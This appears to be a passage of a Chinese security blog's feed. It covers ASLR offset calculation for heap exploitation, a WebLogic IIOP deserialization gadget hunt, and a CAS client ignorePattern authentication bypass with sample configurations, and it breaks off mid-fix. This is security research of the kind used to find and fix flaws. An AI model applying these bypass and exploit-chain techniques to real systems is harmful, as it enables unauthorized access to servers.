ret;</span><br><span class="line"></span><br><span class="line">    alternative_io(<span class="string">&quot;movq %[small],%0&quot;</span>,<span class="string">&quot;movq %[large],%0&quot;</span>,</span><br><span class="line">            X86_FEATURE_LA57,</span><br><span class="line">            <span class="string">&quot;=r&quot;</span> (ret),</span><br><span class="line">            [small] <span class="string">&quot;i&quot;</span> ((<span class="number">1ul</span> &lt;&lt; <span class="number">47</span>)-PAGE_SIZE),</span><br><span class="line">            [large] <span class="string">&quot;i&quot;</span> ((<span class="number">1ul</span> &lt;&lt; <span class="number">56</span>)-PAGE_SIZE));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_mmap_rnd</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> arch_rnd(mmap_is_ia32() ? mmap32_rnd_bits : mmap64_rnd_bits);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_rnd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> rndbits)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(current-&gt;flags &amp; PF_RANDOMIZE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (get_random_long() &amp; ((<span class="number">1UL</span> &lt;&lt; rndbits) - <span class="number">1</span>)) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> rnd, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">                   <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> gap = rlim_stack-&gt;rlim_cur;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pad = stack_maxrandom_size(task_size) + stack_guard_gap;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> gap_min, gap_max;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Values close to RLIM_INFINITY can overflow. */</span></span><br><span class="line">    <span class="keyword">if</span> (gap + pad &gt; gap)</span><br><span class="line">        gap += pad;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Top of mmap area (just below the process stack).</span></span><br><span class="line"><span class="comment">     * Leave an at least ~128 MB hole with possible stack randomization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    gap_min = SIZE_128M;</span><br><span class="line">    gap_max = (task_size / <span class="number">6</span>) * <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (gap &lt; gap_min)</span><br><span class="line">        gap = gap_min;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (gap &gt; gap_max)</span><br><span class="line">        gap = gap_max;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> PAGE_ALIGN(task_size - gap - rnd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="附-固定地址原理">附 固定地址原理</h2><p>因为，我当时是英文论坛和网友交流得出的结论，我这里直接贴我当时回复了。</p><p>I think brk and mmap are two different things in linux. When I malloc small space of linux, malloc will use brk. Inversely, it will use mmap for big space (almost &gt; 128KB).</p><p>In ASLR, both heap and mmap will have a random offset.</p><p>brk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_randomize_brk</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range_end = mm-&gt;brk + <span class="number">0x02000000</span>;</span><br><span class="line">    <span class="keyword">return</span> randomize_range(mm-&gt;brk, range_end, <span class="number">0</span>) ? : mm-&gt;brk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line"></span><br><span class="line">    arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base,</span><br><span class="line">            arch_rnd(mmap64_rnd_bits), task_size_64bit(<span class="number">0</span>),</span><br><span class="line">            rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">arch_pick_mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> *base, <span class="type">unsigned</span> <span class="type">long</span> *legacy_base,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> random_factor, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    *legacy_base = mmap_legacy_base(random_factor, task_size);</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        *base = *legacy_base;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *base = mmap_base(random_factor, task_size, rlim_stack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS: If paging is level 4, task size is 0x7ffffffff000.</p><p>For example, here my heap is from 0x55650f802000 and mmap area is from 0x7fdcf6d94000.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">process <span class="number">1181521</span></span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">          Start Addr           End Addr       Size     Offset objfile</span><br><span class="line">      <span class="number">0x55650f600000</span>     <span class="number">0x55650f602000</span>     <span class="number">0x2000</span>        <span class="number">0x0</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x55650f801000</span>     <span class="number">0x55650f802000</span>     <span class="number">0x1000</span>     <span class="number">0x1000</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x55650f802000</span>     <span class="number">0x55650f803000</span>     <span class="number">0x1000</span>     <span class="number">0x2000</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x556510fde000</span>     <span class="number">0x556510fff000</span>    <span class="number">0x21000</span>        <span class="number">0x0</span> [heap]</span><br><span class="line">      <span class="number">0x7fdcf6d94000</span>     <span class="number">0x7fdcf6dd6000</span>    <span class="number">0x42000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7fdcf6dd6000</span>     <span class="number">0x7fdcf6df8000</span>    <span class="number">0x22000</span>        <span class="number">0x0</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6df8000</span>     <span class="number">0x7fdcf6f70000</span>   <span class="number">0x178000</span>    <span class="number">0x22000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6f70000</span>     <span class="number">0x7fdcf6fbe000</span>    <span class="number">0x4e000</span>   <span class="number">0x19a000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fbe000</span>     <span class="number">0x7fdcf6fc2000</span>     <span class="number">0x4000</span>   <span class="number">0x1e7000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fc2000</span>     <span class="number">0x7fdcf6fc4000</span>     <span class="number">0x2000</span>   <span class="number">0x1eb000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fc4000</span>     <span class="number">0x7fdcf6fca000</span>     <span class="number">0x6000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7fdcf6fdd000</span>     <span class="number">0x7fdcf6fde000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fde000</span>     <span class="number">0x7fdcf7001000</span>    <span class="number">0x23000</span>     <span class="number">0x1000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf7001000</span>     <span class="number">0x7fdcf7009000</span>     <span class="number">0x8000</span>    <span class="number">0x24000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700a000</span>     <span class="number">0x7fdcf700b000</span>     <span class="number">0x1000</span>    <span class="number">0x2c000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700b000</span>     <span class="number">0x7fdcf700c000</span>     <span class="number">0x1000</span>    <span class="number">0x2d000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700c000</span>     <span class="number">0x7fdcf700d000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7ffe19d76000</span>     <span class="number">0x7ffe19d97000</span>    <span class="number">0x21000</span>        <span class="number">0x0</span> [<span class="built_in">stack</span>]</span><br><span class="line">      <span class="number">0x7ffe19df2000</span>     <span class="number">0x7ffe19df6000</span>     <span class="number">0x4000</span>        <span class="number">0x0</span> [vvar]</span><br><span class="line">      <span class="number">0x7ffe19df6000</span>     <span class="number">0x7ffe19df8000</span>     <span class="number">0x2000</span>        <span class="number">0x0</span> [vdso]</span><br><span class="line">  <span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> [vsyscall]</span><br></pre></td></tr></table></figure><p>Besides, the dynamic loader uses mmap(2) with MAP_PRIVATE and appropriate permissions.</p><p><a href="https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes">https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes</a></p><p>So, my understanding is:</p><ol><li><p>If the program is simple, like I can fully predict what will happen e.g. when malloc will be, size of per chunk of mmap, if the program will load .so or uninstall .so, no side effect of random of time, etc. Once the address of chunk in mmap is leaked, I can calc libc base, because as you said：</p><ol><li>Both of them are relative in memory (allocated by mmap).</li><li>The beginning address of mapping is random, but the rest mapping is not random.</li></ol></li><li><p>Finally, I just need to run the program locally to the same leak address following the same steps, and then calculate the fixed offset at that point. This offset will always be valid, even with ASLR.</p></li></ol><p>参考</p><p><a href="https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/">https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/</a></p><p><a href="https://blog.csdn.net/qq_48466156/article/details/139691096">https://blog.csdn.net/qq_48466156/article/details/139691096</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit</a></p><p><a href="http://www.asuka39.top/article/security/ctf/pwn/2582/">http://www.asuka39.top/article/security/ctf/pwn/2582/</a></p>]]></content>
    
    
    <summary type="html">从零开始的二进制旅程</summary>
    
    
    
    <category term="binary" scheme="https://cl0und.xyz/categories/binary/"/>
    
    
    <category term="pwn" scheme="https://cl0und.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>博客重启小记（2）</title>
    <link href="https://cl0und.xyz/2024/08/10/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/"/>
    <id>https://cl0und.xyz/2024/08/10/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/</id>
    <published>2024-08-10T08:44:49.000Z</published>
    <updated>2024-09-14T14:57:18.320Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>有两年多年没有写博客了，最近一次写的话题还是weblogic RCE挖掘 《记一次失败的Weblogic IIOP Gadget挖掘》。虽然当时写的时候标题是“失败的”，但其实后面确实启发了另一位师傅拿到了RCE （CVE-2022-21420）。我要感谢这位师傅，不但因为它挽救了这次失败的利用，还因为它总是在过年的时候给我发红包，手动狗头。</p><p>安全研究是一门艺术，是守正出奇，是推陈出新，是对创造力的磨练。有一起研究技术的小伙伴是幸福的，感谢大学四年能遇到Syclover小组。</p><p>毕业后去了上海，又辗转香港，如今上坡两年了，准备第二次重启我的博客。未来准备更新一些学习binary和distributed system的学习笔记。</p><p>之前redteam.today域名已经被别人买走，以后打算长期用cl0und.github.io了。看到博客友链中能正常访问的已经所剩无几，这更让我到体会长期写博客的不易。希望这次我能坚持得更久一些😆</p><p>顺颂夏安。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;p&gt;有两年多年没有写博客了，最近一次写的话题还是weblogic RCE挖掘 《记一次失败的Weblogic IIOP Gadget挖掘》。虽然当时写的时候标题是“失败的”，但其实后面确实启发了另一位师傅拿到了RCE （CVE-2</summary>
      
    
    
    
    
    <category term="杂" scheme="https://cl0und.xyz/tags/%E6%9D%82/"/>
    
  </entry>
  
  <entry>
    <title>记一次失败的Weblogic IIOP Gadget挖掘</title>
    <link href="https://cl0und.xyz/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/"/>
    <id>https://cl0und.xyz/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/</id>
    <published>2022-04-08T02:19:00.000Z</published>
    <updated>2022-04-08T02:44:51.040Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="前记">前记</h2><p>当时以为挖成功了，结果后来发现是少打了一个补丁，在朋友圈虚晃了一枪。不过整个利用思路还算有趣，这并不妨碍在这里分享一下。</p><h2 id="sink点可行性验证">sink点可行性验证</h2><p>开局风干师傅送了个sink点。</p><p><img src="image-20220304173625-rfymfzd.png" alt="image.png"></p><p>我们先来分析一下sink点com.tangosol.coherence.transaction.internal.storage.KeyBackingMap#put的可行性。</p><p><img src="image-20220304173841-084s55s.png" alt="image.png"></p><p>如果这里this.m_context是ReplicatedCache$BackingMapContext，反序列化的时候会进入BackingMapContext#getValueFromInternalConverter再进入getConverterFromInternal。</p><p><img src="image-20220304174359-croe38f.png" alt="image.png"></p><p>因为this.__m_ConverterFromInternal为transient在反序列的时候为空，根据代码逻辑反序列化的时候会创一个新的converter，并调用convert方法转换受控的oVal的对象。</p><p><img src="image-20220304174728-h7fb6qs.png" alt="image.png"></p><p>我们继续跟进，看一下converter是什么样子的, converter类型固定ReplicatedCache$ConverterFromInternal。</p><p><img src="image-20220304175214-4sf1oh8.png" alt="image.png"></p><p>ReplicatedCache$ConverterFromInternal的convert。</p><p><img src="image-20220304175319-iu49dix.png" alt="image.png"></p><p>是不是很眼熟？没错，<a href="https://xz.aliyun.com/t/9068">是我去年挖weblogic的时候找到的sink点</a>, 二阶反序列化类型。</p><h2 id="补全gadget">补全gadget</h2><p>那么现在需要从source点找一条通路，放入常见的source点自动化跑，无奈工具太菜，大海捞针。捞到一个，应该还有其他的，我没一个一个看了。</p><p><img src="image-20220304225954-l24t1tq.png" alt="image.png"></p><p>接下来再用BadAttributeValueExpException前半段就完全走通了。</p><h2 id="构造exp与javaassit的妙用">构造exp与javaassit的妙用</h2><p>路径找到了接着，就是填充一些必要的条件，构造payload了。</p><p>构造的时候会发现对com.tangosol.coherence.component.util.daemon.queueProcessor.Service有依赖。这个类是实现了Serializable接口的，但是官方的本意是不想让它被序列化的，</p><p><img src="image-20220304210431-375u930.png" alt="image.png"></p><p>不过在反序列化的时候，并没有做对应的检查。所以我们用javaassit强行把这个方法改成$1.defaultWriteObject();</p><p>类似的，javaassit的妙用还可以减轻构造payload时候的痛苦，我们可以审计一部分代码，用javaassit把没用的逻辑阉割掉。</p><p>例如KeyBackingMap构造方法中</p><p><img src="image-20220304211223-x6gne8z.png" alt="image.png"></p><p>context.getCacheService().getInfo().getServiceName(), 一波连环夺命call要正常运行需要各种补全条件，一波操作就为了拿一个没什么卵用的字符串。</p><h2 id="山穷水尽疑无路">山穷水尽疑无路</h2><p>至此一切都在向好的方向发展，首先我用没打补丁weblogic走了一波t3，一发入魂，稳稳的。打上最新补丁后走t3没成功，看报错想起了是去年oracle给t3加了一个ABBREV_CLASSES白名单。</p><p><img src="image-20220304213624-3kn8um9.png" alt="image.png"></p><p>但是没有关系，我们还可以用iiop重拳出击。长久以来我一直觉得t3和iiop是等价的东西，exp走t3成功，那走iiop也可成功，因此一直觉得官方单独给t3加白的操作不多余但没必要。</p><p>直到打完发现没成功，这下有点傻眼了。<br><img src="image-20220304213955-rx8vczj.png" alt="image.png"></p><p>看起来iiop和t3在反序列化的时候还是有不同。根据调用栈和调试可以定位到出错registerMessageType中的getMessageClassMap。</p><p><img src="image-20220304221011-g7od395.png" alt="image.png"></p><p><img src="image-20220304221737-pc9vl4s.png" alt="image.png"><img src="image-20220304221750-gjzcpbp.png" alt="image.png"></p><p>看到这里你可能充满疑惑</p><ul><li>反序列化不是可以控制任意成员变量（不严谨）吗？提前给__m_MessageClassMap设置好，不就可以规避空指针的问题？</li><li>为什么t3的时候没有遇到这个问题？</li></ul><p>这里限于篇幅，我就直接说我调试的结论了。</p><p>关于第一个问题，确实可以控制，但是这里涉及反序列化时序的问题，就算设置了__m_MessageClassMap，逻辑走到这一步的时候成员变量还没有被赋值。</p><p>关于第二个问题，是因为走iiop时，反序列化Component时registerVaildation调用抛出异常了，进入了t3情况下不会进入的validateObject。</p><p><img src="image-20220304222857-dwd6vqx.png" alt="image.png"></p><p>而出现异常的原因是也就是depth为0。</p><p><img src="image-20220304223120-g4g323u.png" alt="image.png"></p><p>通常情况下depth会随着反序列化时的深度动态变化，因此我猜开发的本意是禁止Component成为最外层的对象。</p><p><img src="image-20220304223702-prcmt93.png" alt="image.png"></p><p>但是IIOP因为自身实现的原因，进入了readObjectOverride，从始至终都没有进入readObject0。也就说整个过程depth一直为0。</p><p><img src="image-20220304224620-r2flbv8.png" alt="image.png"></p><p>至此情况变得很难受。t3白名单打不了，iiop因为这个gadget依赖了特殊的类也打不了。功败垂成，我当时觉得非常可惜。又折腾一会找不到替代类就放弃了。</p><h2 id="柳岸花明又一村">柳岸花明又一村</h2><p>大约过了三周之后，我又想起了这个洞，突然eureka。既然正常流能打iiop不能打，那能不能把iiop“转换”成正常流然后再打呢？</p><p>其实通过查看<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">历史漏洞</a>可以知道CVE-2016-3510就可以做到这一点。</p><p><img src="image-20220306223053-llrmlnj.png" alt="image.png"></p><p>至此，全链路已经打通。</p><h2 id="为什么失败">为什么失败</h2><p>交给官方之后被驳回了，后来发现测试的时候少了一个补丁。</p><p>打补丁前：</p><p><img src="image-20220314134013-liz2r0c.png" alt="image.png"></p><p>打补丁后：</p><p>这里this.setFilter默认为true，也就说从2021的某一次补丁之后fromBinary这个点加了黑名单已经打不了。</p><p><img src="image-20220314135356-eyrxbug.png" alt="image.png"></p><h2 id="后记">后记</h2><p>虽然根据CVE-2016-3510，iiop和t3在漏洞利用上已经完全等价了。t3白不白已经不重要了，但t3白名单真的无法绕过吗？其实是可以的，但是这里空白太小写不下……</p>]]></content>
    
    
    <summary type="html">Introduce some insteresting tricks of building exp.</summary>
    
    
    
    <category term="web security" scheme="https://cl0und.xyz/categories/web-security/"/>
    
    
    <category term="java" scheme="https://cl0und.xyz/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Two Tricks Of CAS-CLIENT AUTH Bypass</title>
    <link href="https://cl0und.xyz/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/"/>
    <id>https://cl0und.xyz/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/</id>
    <published>2021-08-31T12:56:13.000Z</published>
    <updated>2021-08-31T13:16:36.232Z</updated>
    
    <content type="html"><![CDATA[<p>首发于<a href="https://xz.aliyun.com/t/9557">先知社区</a></p><!-- more --><p>cas client 用于限制匿名用户对某些特定api的访问，在一些特殊的环境下可能会有权限绕过问题。下面分享两个实际生活中遇到的案例。</p><h2 id="bypass-trick1-ignorePattern">bypass trick1 ignorePattern</h2><h3 id="场景">场景</h3><p>/api/admin这个url是需要cas登陆才能访问的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/api/admin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/api/guest这个是公共页面，所有人都可以看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuestController</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/guest&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">guest</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello guest&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设此程序的技术比较老旧，为了实现上面这种需求，那么开发可能会在web.xml中这么配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.authentication.AuthenticationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerUrlPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://battags.ad.ess.rutgers.edu:8443/cas<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://www.acme-client.com<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/api/guest<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样配置看起来似乎没有问题<br><img src="20210510105915-b44b6e76-b13b-1.png" alt="image.png"></p><h3 id="利用">利用</h3><p>但是其实可以被花式绕过。</p><p><img src="20210510105932-bea9e8de-b13b-1.png" alt="image.png"></p><h3 id="原理">原理</h3><p>原因有两点，第一org.jasig.cas.client.authentication.AuthenticationFilter，在匹配时候获取了原生url（未处理…/），甚至包括<code>?</code> 后的内容。</p><p><img src="20210510105946-c6c565ca-b13b-1.png" alt="image.png"></p><p>第二，filter的匹配模式有四种，默认是按正则匹配。<br><img src="20210510105953-cb7b4b34-b13b-1.png" alt="image.png"></p><p><img src="20210510110002-d0cd2f3a-b13b-1.png" alt="image.png"></p><p>同理如果配置成CONTAINS也会有类似的问题。</p><p>同理封装了这个库的三方库也会有问题，比较流行的是**<a href="https://github.com/Unicon/cas-client-autoconfig-support">cas-client-autoconfig-support</a>**  ，它常与springboot集成使用，如果有如下配置也会出问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cas.ignorePattern=/api/guest</span><br></pre></td></tr></table></figure><h3 id="修复">修复</h3><p>所以正确的配置应该改为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 